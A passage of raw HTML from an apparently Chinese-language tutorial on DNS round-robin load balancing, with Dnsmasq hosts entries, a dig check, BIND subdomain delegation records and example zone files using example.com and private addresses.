</div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0023 seconds] -->\r\n<p>Dnsmasq 在 <code>/etc/hosts</code> 文件中保存 A 和 AAAA 记录：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a47c37e7862250159\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n172.16.1.10 fileserv fileserv.example.com\r\n172.16.1.11 fileserv fileserv.example.com\r\n172.16.1.12 fileserv fileserv.example.com\r\nfd02:faea:f561:8fa0:1::10 fileserv fileserv.example.com\r\nfd02:faea:f561:8fa0:1::11 fileserv fileserv.example.com\r\nfd02:faea:f561:8fa0:1::12 fileserv fileserv.example.com\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47c37e7862250159-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a47c37e7862250159-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47c37e7862250159-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a47c37e7862250159-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47c37e7862250159-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a47c37e7862250159-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47c37e7862250159-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a47c37e7862250159-1\"><span class=\"crayon-cn\">172.16.1.10</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">fileserv </span><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">com</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a47c37e7862250159-2\"><span class=\"crayon-cn\">172.16.1.11</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">fileserv </span><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">com</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a47c37e7862250159-3\"><span class=\"crayon-cn\">172.16.1.12</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">fileserv </span><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">com</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a47c37e7862250159-4\"><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">10</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">fileserv </span><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">com</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a47c37e7862250159-5\"><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">11</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">fileserv </span><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">com</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a47c37e7862250159-6\"><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">12</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">fileserv </span><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">com</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a47c37e7862250159-7\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0017 seconds] -->\r\n<p>请注意这些示例都是很简化的，解析完全合格域名有多种方法，因此，关于如何配置 DNS 请自行学习。</p>\n<p>使用 <code>dig</code> 命令去检查你的配置能否按预期工作。将 <code>ns.example.com</code> 替换为你的域名服务器：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a47c37eb759561884\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ dig @ns.example.com fileserv A fileserv AAA\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47c37eb759561884-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a47c37eb759561884-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a47c37eb759561884-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">dig</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">ns</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">com </span><span class=\"crayon-i\">fileserv</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">fileserv </span><span class=\"crayon-i\">AAA</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a47c37eb759561884-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>它将同时显示出 IPv4 和 IPv6 的轮询记录。</p>\n<h3 id=\"toc_2\">子域委派和轮询</h3>\n<p>子域委派结合轮询要做的配置会更多，但是这样有一些好处。当你有多个子域或者地理位置比较分散的服务器时，就应该去使用它。它的响应时间更快，并且宕机的服务器不会去响应，因此客户端不会因为等待回复而被挂住。一个短的 TTL，比如 60 秒，就能帮你做到。</p>\n<p>这种方法需要多台域名服务器。在最简化的场景中，你需要一台主域名服务器和两个子域，每个子域都有它们自己的域名服务器。在子域服务器上配置你的轮询记录，然后在你的主域名服务器上配置委派。</p>\n<p>在主域名服务器上的 BIND 中，你至少需要两个额外的配置，一个区声明以及在区数据文件中的 A/AAAA 记录。主域名服务器中的委派应该像如下的内容：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a47c37ef510330839\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nns1.sub.example.com. IN A 172.16.1.20\r\nns1.sub.example.com. IN AAAA fd02:faea:f561:8fa0:1::20\r\nns2.sub.example.com. IN A 172.16.1.21\r\nns2.sub.example.com. IN AAA fd02:faea:f561:8fa0:1::21\r\n\r\nsub.example.com. IN NS ns1.sub.example.com.\r\nsub.example.com. IN NS ns2.sub.example.com.\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47c37ef510330839-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a47c37ef510330839-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47c37ef510330839-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a47c37ef510330839-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47c37ef510330839-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a47c37ef510330839-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47c37ef510330839-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a47c37ef510330839-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a47c37ef510330839-1\"><span class=\"crayon-v\">ns1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">172.16.1.20</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a47c37ef510330839-2\"><span class=\"crayon-v\">ns1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AAAA </span><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">20</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a47c37ef510330839-3\"><span class=\"crayon-v\">ns2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">172.16.1.21</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a47c37ef510330839-4\"><span class=\"crayon-v\">ns2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AAA </span><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">21</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a47c37ef510330839-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a47c37ef510330839-6\"><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">NS </span><span class=\"crayon-v\">ns1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a47c37ef510330839-7\"><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">NS </span><span class=\"crayon-v\">ns2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a47c37ef510330839-8\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0024 seconds] -->\r\n<p>接下来的每台子域服务器上有它们自己的区文件。在这里它的关键点是每个服务器去返回它<strong>自己的</strong> IP 地址。在 <code>named.conf</code> 中的区声明，所有的服务上都是一样的：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a47c37f2205738237\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nzone \"sub.example.com\" {\r\n    type master;\r\n    file \"db.sub.example.com\";\r\n};\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47c37f2205738237-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a47c37f2205738237-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47c37f2205738237-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a47c37f2205738237-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47c37f2205738237-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a47c37f2205738237-1\"><span class=\"crayon-i\">zone</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"sub.example.com\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a47c37f2205738237-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">type </span><span class=\"crayon-v\">master</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a47c37f2205738237-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">file</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"db.sub.example.com\"</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a47c37f2205738237-4\"><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a47c37f2205738237-5\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>然后数据文件也是相同的，除了那个 A/AAAA 记录使用的是各个服务器自己的 IP 地址。SOA 记录都指向到主域名服务器：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a47c37f6712170541\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n; first subdomain name server\r\n$ORIGIN sub.example.com.\r\n$TTL 60\r\nsub.example.com  IN SOA ns1.example.com. admin.example.com. (\r\n        2018123456      ; serial\r\n        3H              ; refresh\r\n        15              ; retry\r\n        3600000         ; expire\r\n)\r\n\r\nsub.example.com. IN NS ns1.sub.example.com.\r\nsub.example.com. IN A  172.16.1.20\r\nns1.sub.example.com.  IN AAAA  fd02:faea:f561:8fa0:1::20\r\n; second subdomain name server\r\n$ORIGIN sub.example.com.\r\n$TTL 60\r\nsub.example.com  IN SOA ns1.example.com. admin.example.com. (\r\n        2018234567      ; serial\r\n        3H              ; refresh\r\n        15              ; retry\r\n        3600000         ; expire\r\n)\r\n\r\nsub.example.com. IN NS ns1.sub.example.com.\r\nsub.example.com. IN A  172.16.1.21\r\nns2.sub.example.com.  IN AAAA  fd02:faea:f561:8fa0:1::21\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47c37f6712170541-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a47c37f6712170541-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47c37f6712170541-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a47c37f6712170541-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47c37f6712170541-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a47c37f6712170541-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47c37f6712170541-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a47c37f6712170541-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47c37f6712170541-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a47c37f6712170541-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47c37f6712170541-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a47c37f6712170541-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47c37f6712170541-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a47c37f6712170541-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47c37f6712170541-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a47c37f6712170541-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47c37f6712170541-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a47c37f6712170541-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47c37f6712170541-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a47c37f6712170541-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47c37f6712170541-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a47c37f6712170541-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47c37f6712170541-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a47c37f6712170541-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47c37f6712170541-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a47c37f6712170541-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47c37f6712170541-27\">27</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" 